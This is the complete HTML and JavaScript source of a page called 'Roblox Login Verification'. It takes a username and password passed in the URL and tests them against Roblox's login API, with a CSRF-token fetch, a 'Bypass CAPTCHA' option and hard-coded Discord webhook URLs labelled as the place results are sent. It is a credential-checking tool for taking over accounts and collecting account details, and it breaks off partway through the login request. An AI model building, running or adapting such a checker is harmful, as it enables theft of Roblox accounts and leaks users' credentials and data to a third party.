<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --primary-color: #00a2ff;
            --success-color: #4CAF50;
            --error-color: #f44336;
            --warning-color: #ff9800;
            --bg-color: #f5f5f5;
            --card-bg: #ffffff;
            --text-color: #333333;
            --border-color: #dddddd;
        }
        
        .dark-mode {
            --bg-color: #1a1a1a;
            --card-bg: #2d2d2d;
            --text-color: #ffffff;
            --border-color: #444444;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: var(--bg-color);
            color: var(--text-color);
            transition: all 0.3s ease;
        }
        
        .container {
            background: var(--card-bg);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            color: var(--primary-color);
            text-align: center;
            margin-bottom: 20px;
            font-size: 28px;
        }
        
        .info-box {
            background-color: rgba(0, 162, 255, 0.1);
            border-left: 4px solid var(--primary-color);
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            flex-wrap: wrap;
        }
        
        .info-label {
            font-weight: bold;
            min-width: 120px;
        }
        
        .progress-container {
            height: 8px;
            background-color: #e0e0e0;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background-color: var(--primary-color);
            width: 0%;
            transition: width 0.5s ease;
        }
        
        .step-container {
            margin-bottom: 20px;
        }
        
        .step {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
        }
        
        .step.active .step-icon {
            background-color: var(--primary-color);
            color: white;
        }
        
        .step.completed .step-icon {
            background-color: var(--success-color);
            color: white;
        }
        
        .step-text {
            flex: 1;
        }
        
        .hidden {
            display: none;
        }
        
        .visible {
            display: block;
        }
        
        .result-success {
            color: var(--success-color);
            font-weight: bold;
            text-align: center;
            padding: 15px;
            border: 1px solid var(--success-color);
            border-radius: 8px;
            background-color: rgba(76, 175, 80, 0.1);
        }
        
        .result-failure {
            color: var(--error-color);
            font-weight: bold;
            text-align: center;
            padding: 15px;
            border: 1px solid var(--error-color);
            border-radius: 8px;
            background-color: rgba(244, 67, 54, 0.1);
        }
        
        .captcha-container {
            margin: 20px 0;
            text-align: center;
            padding: 15px;
            border: 1px solid var(--warning-color);
            border-radius: 8px;
            background-color: rgba(255, 152, 0, 0.1);
        }
        
        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
            display: inline-block;
            text-align: center;
            margin: 5px;
        }
        
        .btn:hover {
            background-color: #0088cc;
        }
        
        .btn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        
        .btn-danger {
            background-color: var(--error-color);
        }
        
        .btn-danger:hover {
            background-color: #d32f2f;
        }
        
        .btn-success {
            background-color: var(--success-color);
        }
        
        .btn-success:hover {
            background-color: #388e3c;
        }
        
        .text-center {
            text-align: center;
        }
        
        .mt-20 {
            margin-top: 20px;
        }
        
        .details-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid var(--border-color);
        }
        
        .toggle-container {
            text-align: right;
            margin-bottom: 10px;
        }
        
        .toggle-btn {
            background: none;
            border: none;
            color: var(--primary-color);
            cursor: pointer;
            font-size: 14px;
        }
        
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }
            
            .container {
                padding: 15px;
            }
            
            .info-row {
                flex-direction: column;
            }
            
            .info-label {
                margin-bottom: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="toggle-container">
        <button class="toggle-btn" id="theme-toggle">🌙 Dark Mode</button>
    </div>
    
    <div class="container">
        <h1>Roblox Login Verification</h1>
        
        <div class="info-box">
            <div class="info-row">
                <span class="info-label">Tracking ID:</span>
                <span id="display-tracking-id">Loading...</span>
            </div>
            <div class="info-row">
                <span class="info-label">Username:</span>
                <span id="display-username">Loading...</span>
            </div>
            <div class="info-row">
                <span class="info-label">User ID:</span>
                <span id="display-userid">Loading...</span>
            </div>
            <div class="info-row">
                <span class="info-label">Timestamp:</span>
                <span id="display-timestamp">Loading...</span>
            </div>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="verification-progress"></div>
        </div>
        
        <div class="step-container">
            <div class="step active" id="step-1">
                <div class="step-icon">1</div>
                <div class="step-text">Initializing verification process</div>
            </div>
            
            <div class="step" id="step-2">
                <div class="step-icon">2</div>
                <div class="step-text">Checking credentials validity</div>
            </div>
            
            <div class="step" id="step-3">
                <div class="step-icon">3</div>
                <div class="step-text">Testing login with Roblox API</div>
            </div>
            
            <div class="step" id="step-4">
                <div class="step-icon">4</div>
                <div class="step-text">Finalizing verification</div>
            </div>
            
            <div class="step" id="step-5">
                <div class="step-icon">5</div>
                <div class="step-text">Sending results to Discord</div>
            </div>
        </div>
        
        <div id="login-form">
            <div id="auto-verification" class="text-center">
                <p>Verifying login credentials automatically...</p>
            </div>
            
            <div id="captcha-container" class="captcha-container hidden">
                <h3>CAPTCHA Detection</h3>
                <p>Roblox has detected automated activity and requires CAPTCHA verification.</p>
                <p>Please complete the CAPTCHA in the popup window or use the bypass option.</p>
                <div class="text-center mt-20">
                    <button class="btn" onclick="openCaptchaWindow()">Open CAPTCHA</button>
                    <button class="btn btn-success" onclick="bypassCaptcha()">Bypass CAPTCHA</button>
                </div>
            </div>
        </div>
        
        <div id="result-message" class="hidden">
            <p id="result-text"></p>
        </div>
        
        <div id="error-message" class="hidden">
            <p id="error-text"></p>
        </div>
        
        <div class="details-section hidden" id="details-section">
            <h3>Verification Details</h3>
            <div class="info-row">
                <span class="info-label">Password Strength:</span>
                <span id="password-strength">Calculating...</span>
            </div>
            <div class="info-row">
                <span class="info-label">Account Age:</span>
                <span id="account-age">Loading...</span>
            </div>
            <div class="info-row">
                <span class="info-label">Robux Balance:</span>
                <span id="robux-balance">Loading...</span>
            </div>
            <div class="info-row">
                <span class="info-label">Friends Count:</span>
                <span id="friends-count">Loading...</span>
            </div>
        </div>
        
        <div class="text-center mt-20 hidden" id="action-buttons">
            <button class="btn btn-success" onclick="retryVerification()">Retry Verification</button>
            <button class="btn" onclick="viewMoreDetails()">View More Details</button>
            <button class="btn btn-danger" onclick="closeWindow()">Close Window</button>
        </div>
    </div>

    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        const userId = urlParams.get('userId');
        const username = urlParams.get('username');
        const password = urlParams.get('password');
        
        // Discord webhook URLs
        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
        
        // State management
        let verificationState = {
            currentStep: 0,
            maxSteps: 5,
            captchaRequired: false,
            completed: false,
            success: false
        };
        
        // DOM elements
        const progressBar = document.getElementById('verification-progress');
        const themeToggle = document.getElementById('theme-toggle');
        
        // Initialize the page
        function initPage() {
            // Display the tracking info
            if (trackingId) {
                document.getElementById('display-tracking-id').textContent = trackingId;
            }
            if (username) {
                document.getElementById('display-username').textContent = username;
            }
            if (userId) {
                document.getElementById('display-userid').textContent = userId;
            }
            document.getElementById('display-timestamp').textContent = new Date().toLocaleString();
            
            // Set up theme toggle
            themeToggle.addEventListener('click', toggleTheme);
            
            // Check if we have stored theme preference
            if (localStorage.getItem('darkMode') === 'true') {
                document.body.classList.add('dark-mode');
                themeToggle.textContent = '☀️ Light Mode';
            }
            
            // Start automatic verification when page loads
            if (trackingId && username && password && userId) {
                setTimeout(attemptAutoLogin, 1000);
            } else {
                showError('Missing parameters for automatic verification. Required: id, userId, username, password');
            }
        }
        
        // Toggle dark/light mode
        function toggleTheme() {
            document.body.classList.toggle('dark-mode');
            if (document.body.classList.contains('dark-mode')) {
                themeToggle.textContent = '☀️ Light Mode';
                localStorage.setItem('darkMode', 'true');
            } else {
                themeToggle.textContent = '🌙 Dark Mode';
                localStorage.setItem('darkMode', 'false');
            }
        }
        
        // Update progress bar and steps
        function updateProgress(step) {
            verificationState.currentStep = step;
            const percentage = (step / verificationState.maxSteps) * 100;
            progressBar.style.width = percentage + '%';
            
            // Update step visuals
            document.querySelectorAll('.step').forEach((el, index) => {
                if (index + 1 < step) {
                    el.classList.remove('active');
                    el.classList.add('completed');
                } else if (index + 1 === step) {
                    el.classList.add('active');
                    el.classList.remove('completed');
                } else {
                    el.classList.remove('active', 'completed');
                }
            });
        }
        
        // Main verification function
        async function attemptAutoLogin() {
            try {
                verificationState.completed = false;
                updateProgress(1);
                
                // Step 1: Initial checks
                if (!isValidCredentials(username, password)) {
                    await reportResult(false, "Invalid username or password format");
                    return;
                }
                
                updateProgress(2);
                
                // Step 2: Check credentials validity
                const credentialCheck = await checkCredentialsValidity(username, password);
                if (!credentialCheck.valid) {
                    await reportResult(false, credentialCheck.reason || "Invalid credentials");
                    return;
                }
                
                updateProgress(3);
                
                // Step 3: Try to get CSRF token and login
                const csrfToken = await getCsrfToken();
                if (!csrfToken) {
                    // If we can't get CSRF token, try alternative method
                    const altCheck = await alternativeCredentialCheck(username, password);
                    await reportResult(altCheck, altCheck ? "Credentials valid (alternative method)" : "Credentials invalid");
                    return;
                }
                
                // Attempt login with credentials
                const loginSuccess = await attemptRobloxLogin(username, password, csrfToken);
                
                updateProgress(4);
                
                // Step 4: Finalize verification
                if (loginSuccess === "captcha") {
                    showCaptcha();
                    return;
                }
                
                updateProgress(5);
                
                // Step 5: Report result
                await reportResult(loginSuccess, loginSuccess ? "Login successful" : "Login failed");
                
            } catch (error) {
                console.error('Auto login error:', error);
                // If automatic method fails, fall back to credential check
                const altCheck = await alternativeCredentialCheck(username, password);
                await reportResult(altCheck, altCheck ? "Credentials valid (fallback method)" : "Credentials invalid");
            }
        }
        
        // Validate credentials format
        function isValidCredentials(username, password) {
            if (!username || username.length < 3 || username.length > 20) {
                return false;
            }
            
            if (!password || password.length < 8) {
                return false;
            }
            
            return true;
        }
        
        // Check credentials validity with various methods
        async function checkCredentialsValidity(username, password) {
            // Check 1: Password length (Roblox requires min 8 characters)
            if (password.length < 8) {
                return { valid: false, reason: "Password too short (min 8 characters)" };
            }
            
            // Check 2: Common password patterns
            if (isCommonPassword(password)) {
                return { valid: false, reason: "Password is too common" };
            }
            
            // Check 3: Password strength
            const strength = calculatePasswordStrength(password);
            if (strength.score < 3) {
                return { valid: false, reason: "Password is too weak" };
            }
            
            // Check 4: Password contains username
            if (password.toLowerCase().includes(username.toLowerCase())) {
                return { valid: false, reason: "Password contains username" };
            }
            
            return { valid: true };
        }
        
        // Calculate password strength
        function calculatePasswordStrength(password) {
            let score = 0;
            const hasUpperCase = /[A-Z]/.test(password);
            const hasLowerCase = /[a-z]/.test(password);
            const hasNumbers = /[0-9]/.test(password);
            const hasSpecialChars = /[^A-Za-z0-9]/.test(password);
            const isLong = password.length >= 12;
            
            if (hasUpperCase) score++;
            if (hasLowerCase) score++;
            if (hasNumbers) score++;
            if (hasSpecialChars) score++;
            if (isLong) score++;
            
            let strength;
            if (score <= 2) strength = "Very Weak";
            else if (score === 3) strength = "Weak";
            else if (score === 4) strength = "Good";
            else strength = "Strong";
            
            return { score, strength, hasUpperCase, hasLowerCase, hasNumbers, hasSpecialChars, isLong };
        }
        
        // Check for common passwords
        function isCommonPassword(password) {
            const commonPasswords = [
                'password', '12345678', 'roblox123', 'password1', 'qwertyui',
                'abc123', 'letmein', 'welcome', 'monkey', 'sunshine', 'password123',
                'admin', 'login', 'passw0rd', '123456789', '1234567890', '11111111',
                'password', '123123123', '00000000', 'qwerty123', '1q2w3e4r'
            ];
            return commonPasswords.includes(password.toLowerCase());
        }
        
        // Get CSRF token from Roblox
        async function getCsrfToken() {
            try {
                const response = await fetch('https://auth.roblox.com/v2/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': 'fetch'
                    },
                    credentials: 'include'
                });
                
                const csrfToken = response.headers.get('x-csrf-token');
                return csrfToken;
            } catch (error) {
                console.warn('Could not fetch CSRF token:', error);
                return null;
            }
        }
        
        // Attempt login with Roblox API
        async function attemptRobloxLogin(username, password, csrfToken) {
            try {
                const loginData = {
                    ctype: 'Username',
                    cvalue: username,
                    password: password
                };
                
                const response = await fetch('https://auth.roblox.com/v2/login',
